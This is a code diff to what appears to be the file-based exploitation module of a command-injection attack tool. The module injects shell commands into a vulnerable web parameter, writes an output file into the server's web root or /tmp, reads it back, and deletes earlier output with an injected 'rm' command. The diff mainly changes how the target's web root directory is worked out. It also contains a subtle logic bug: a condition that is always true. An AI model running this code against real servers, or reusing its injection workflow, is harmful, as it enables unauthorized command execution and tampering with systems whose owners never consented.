@@ -23,6 +23,7 @@ import random
 import base64
 import urllib
 import urllib2
+import urlparse 
 
 from src.utils import menu
 from src.utils import logs
@@ -48,7 +49,7 @@ If temp-based technique failed, use the "/tmp/" directory for tempfile-based tec
 """
 def tfb_controller(no_result, url, delay, filename, tmp_path, http_request_method, url_time_response):
   if no_result == True:
-    sys.stdout.write("(*) Trying to upload file, on temporary directory (" + tmp_path + ")...\n")
+    sys.stdout.write("(*) Trying to create a file, on temporary directory (" + tmp_path + ")...\n")
     tfb_handler.exploitation(url, delay, filename, tmp_path, http_request_method, url_time_response)     
   else :
     sys.stdout.write("\r")
@@ -58,7 +59,7 @@ def tfb_controller(no_result, url, delay, filename, tmp_path, http_request_metho
 Delete previous shells outputs.
 """
 def delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
-  cmd = "rm " + OUTPUT_TEXTFILE
+  cmd = "rm " + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE
   response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell=None)
 
 
@@ -85,19 +86,35 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
     tmp_path = menu.options.tmp_path
   else:
     tmp_path = settings.TMP_PATH
-                  
-  print "(*) Testing the "+ technique + "... "
-    
+                      
   if menu.options.file_dest:
     if '/tmp/' in menu.options.file_dest:
       call_tmp_based = True
     SRV_ROOT_DIR = os.path.split(menu.options.file_dest)[0]
   else:
     if menu.options.srv_root_dir:
-      SRV_ROOT_DIR = menu.options.srv_root_dir
+      settings.SRV_ROOT_DIR = menu.options.srv_root_dir
+
     else:
-      SRV_ROOT_DIR = settings.SRV_ROOT_DIR
-  
+      # Add "/html" to servers root directory
+      if "debian" or "fedora" or "centos" in settings.SERVER_BANNER.lower():
+        settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + "/html"
+
+      path = urlparse.urlparse(url).path
+      path_parts = path.split('/')
+      count = 0
+      for part in path_parts:        
+        count = count + 1
+      count = count - 1
+      last_param = path_parts[count]
+      EXTRA_DIR = path.replace(last_param, "")
+      settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + EXTRA_DIR
+
+  if not menu.options.verbose:
+    print "(*) Trying to create a file on " + settings.SRV_ROOT_DIR + "... "
+  else:
+    print "(*) Testing the "+ technique + "... "
+
   i = 0
   # Calculate all possible combinations
   total = len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)
@@ -135,6 +152,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
 
           # Check if defined "--verbose" option.
           if menu.options.verbose:
+            print "(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + settings.SRV_ROOT_DIR + "..."
             print Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL
 
           # Cookie Injection
@@ -160,14 +178,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
             response, vuln_parameter = fb_injector.injection_test(payload, http_request_method, url)
 
           # Find the directory.
-          path = url
-          path_parts = path.split('/')
-          count = 0
-          for part in path_parts:        
-            count = count + 1
-          count = count - 1
-          last_param = path_parts[count]
-          output = url.replace(last_param, OUTPUT_TEXTFILE)
+          output = fb_injector.injection_output(url, OUTPUT_TEXTFILE, delay)
           time.sleep(delay)
           
           try:
@@ -181,7 +192,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
             shell = re.findall(r"" + TAG + "", html_data)
             if len(shell) != 0 and not menu.options.verbose:
               percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
-              sys.stdout.write("\r(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + SRV_ROOT_DIR + "... [ " + percent + " ]")  
+              sys.stdout.write("\r(*) Testing the "+ technique + "... [ " + percent + " ]")  
               sys.stdout.flush()
               
           except urllib2.HTTPError, e:
@@ -198,7 +209,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
                 elif i == failed_tries and no_result == True :
                   if not menu.options.verbose:
                     print ""
-                  print Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write on "+ SRV_ROOT_DIR + "." + Style.RESET_ALL
+                  print Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write on "+ settings.SRV_ROOT_DIR + "." + Style.RESET_ALL
                   while True:
                     tmp_upload = raw_input("(?) Do you want to try the temporary directory (" + tmp_path + ") [Y/n] > ").lower()
                     if tmp_upload in settings.CHOISE_YES:
@@ -225,7 +236,8 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
                           percent = str(percent)+"%"
                       else:
                         percent = str(percent)+"%"
-                      sys.stdout.write("\r(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + SRV_ROOT_DIR + "... [ " + percent + " ]")  
+
+                      sys.stdout.write("\r(*) Testing the "+ technique + "... [ " + percent + " ]")  
                       sys.stdout.flush()
                       continue
                     else:
